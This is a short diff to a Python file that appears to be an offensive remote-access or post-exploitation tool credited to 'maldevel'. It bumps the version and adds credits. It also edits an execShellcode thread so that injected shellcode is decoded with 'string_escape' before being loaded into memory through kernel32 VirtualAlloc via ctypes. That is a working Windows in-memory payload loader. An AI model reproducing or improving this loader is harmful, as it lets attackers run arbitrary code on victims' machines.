@@ -23,9 +23,9 @@
 
 __author__ = "maldevel"
 __copyright__ = "Copyright (c) 2016 @maldevel"
-__credits__ = ["maldevel", "byt3bl33d3r"]
+__credits__ = ["maldevel", "carnal0wnage", "byt3bl33d3r"]
 __license__ = "GPLv3"
-__version__ = "1.0"
+__version__ = "1.1"
 __maintainer__ = "maldevel"
 
 
@@ -771,7 +771,8 @@ class execShellcode(threading.Thread):
 
     def run(self):
         try:
-            shellcode = bytearray(self.shellc)
+            shellcode = self.shellc.decode("string_escape")
+            shellcode = bytearray(shellcode)
 
             ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), 
                                                       ctypes.c_int(len(shellcode)), 
